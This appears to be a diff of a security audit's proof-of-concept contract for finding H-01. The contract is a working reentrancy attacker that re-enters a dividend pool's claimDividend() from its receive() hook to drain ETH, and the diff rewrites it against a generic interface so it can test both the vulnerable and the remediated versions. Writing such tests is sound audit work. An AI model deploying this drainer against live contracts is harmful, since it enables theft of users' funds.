@@ -1,28 +1,31 @@
 // SPDX-License-Identifier: MIT
 pragma solidity 0.8.24;
 
-import {MemeTax} from "../../src/MemeTax.sol";
+interface IDividendPool {
+    function claimDividend() external;
+    function pendingDividend(address account) external view returns (uint256);
+}
 
 /// @notice Proof-of-concept attacker for H-01.
-/// @dev `claimDividend()` sends ETH before zeroing the balance, so every
-///      re-entrant call still reads the attacker's original entitlement.
+/// @dev Deliberately written against a minimal interface so the same attacker
+///      can be pointed at both the vulnerable token and the remediated one.
 contract ReentrantClaimer {
-    MemeTax public immutable token;
+    IDividendPool public immutable pool;
     uint256 public reentries;
 
-    constructor(MemeTax _token) {
-        token = _token;
+    constructor(address _pool) {
+        pool = IDividendPool(_pool);
     }
 
     function attack() external {
-        token.claimDividend();
+        pool.claimDividend();
     }
 
     receive() external payable {
-        uint256 share = token.pendingDividend(address(this));
-        if (share > 0 && address(token).balance >= share) {
+        uint256 share = pool.pendingDividend(address(this));
+        if (share > 0 && address(pool).balance >= share) {
             reentries++;
-            token.claimDividend();
+            pool.claimDividend();
         }
     }
 }
